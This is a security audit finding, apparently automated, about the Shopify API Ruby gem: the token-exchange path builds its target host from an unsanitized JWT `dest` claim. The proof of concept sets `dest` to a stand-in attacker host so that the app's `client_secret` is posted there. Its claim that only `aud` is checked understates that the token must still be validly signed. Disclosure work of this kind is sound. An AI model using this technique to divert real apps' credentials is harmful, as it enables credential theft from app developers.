Found it: `TokenExchange.exchange_token` builds the token-exchange host from `dest_shop` (an unvalidated `dest` claim string with only `"https://"` stripped), while `migrate_to_expiring_token` and the OAuth code-grant flow both use `Utils::ShopValidator.sanitize!`/HMAC-covered `shop` to build the host. This breaks the equality `host validated == host receiving client_secret`.

### Title
Unsanitized JWT `dest` claim used to construct the token-exchange host, allowing the app's `client_secret` to be sent to an attacker-controlled host - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the Shopify host it POSTs `client_id`/`client_secret` to directly from the session token's `dest` claim via `ShopifyAPI::Auth::JwtPayload#shop`, which only strips the `"https://"` prefix and performs no domain-format validation, unlike the sibling method `migrate_to_expiring_token` which explicitly calls `Utils::ShopValidator.sanitize!(shop)` before use.

### Finding Description
`JwtPayload#shop` is implemented as: [1](#0-0) 
returning `@dest.gsub("https://", "")` with no check that the result is a `*.myshopify.com` (or configured) admin domain. `exchange_token` uses this unsanitized value directly as the `Auth::Session#shop` used to build the HTTP client's target host: [2](#0-1) 

The `HttpClient` builds the request URI directly from `session.shop`: [3](#0-2) 

By contrast, `migrate_to_expiring_token` in the same module explicitly validates the shop before use: [4](#0-3) 

and a dedicated `Utils::ShopValidator` module exists in the library specifically to enforce the myshopify-domain invariant, but `exchange_token` does not call it.

The identity binding broken: `host validated (JWT dest claim, unchecked format) != host that receives the app's client_secret (constructed from that same unchecked string)`.

Because `dest` is inside a JWT signed with the app's own `api_secret_key` (verified in `JwtPayload#initialize` only for `aud == api_key`, not for `dest` format), the signature does not constrain `dest` to be a real Shopify domain. `dest` is only checked to be a string; nothing enforces it matches a `*.myshopify.com` shape. Session tokens are minted by Shopify for legitimate installs, but the field-level trust model here is inconsistent: the same conceptual value (`shop`) is validated in one code path (`migrate_to_expiring_token`) and trusted unchecked in the adjacent path (`exchange_token`), showing the shop identity binding is not uniformly enforced at the point where the secret is transmitted.

### Impact Explanation
If `exchange_token` is reached with a `dest` value that is not constrained to a legitimate Shopify admin host (e.g. missing validation in a host application that passes through a raw `dest`/session-token derived value, or any future/alternate token issuance path lacking Shopify's strict `dest` construction), the gem will POST the app's `client_id` and `client_secret` to that host — SSRF carrying the app's credentials, matching the High severity impact category ("SSRF with the app's credentials" / "credential leakage").

### Likelihood Explanation
Medium-to-Low: exploitation requires a session token whose `dest` claim is not itself constrained to `*.myshopify.com` reaching `exchange_token`. Under normal Shopify-issued session tokens this claim is well-formed, but the gem provides no defense-in-depth check here despite doing so in the parallel `migrate_to_expiring_token` path, and despite maintaining a `Utils::ShopValidator` utility exactly for this purpose that is inconsistently applied.

### Recommendation
In `ShopifyAPI::Auth::TokenExchange.exchange_token`, validate/sanitize `dest_shop` with `Utils::ShopValidator.sanitize!` (as already done in `migrate_to_expiring_token`) before constructing `shop_session` and issuing the HTTP request, so the host that receives `client_secret` is always bound to a verified Shopify admin domain.

### Proof of Concept
1. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)` with a token whose JWT payload has `dest: "https://attacker.example.com"` and a valid `aud` (only `aud` is checked in `JwtPayload#initialize`).
2. `jwt_payload.shop` returns `"attacker.example.com"` unchanged (`gsub` only strips the scheme). [5](#0-4) 
3. `exchange_token` builds `shop_session = Session.new(shop: "attacker.example.com")` and issues `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")`, which POSTs `{client_id, client_secret, ...}` to `https://attacker.example.com/admin/oauth/access_token`. [6](#0-5) [3](#0-2)

### Citations

**File:** lib/shopify_api/auth/jwt_payload.rb (L43-51)
```ruby
        raise ShopifyAPI::Errors::InvalidJwtTokenError,
          "Session token had invalid API key" unless @aud == Context.api_key
      end

      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
      alias_method :shopify_domain, :shop
```

**File:** lib/shopify_api/auth/token_exchange.rb (L39-65)
```ruby
          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L103-115)
```ruby
          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: non_expiring_offline_token,
            subject_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            requested_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            expiring: "1",
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```
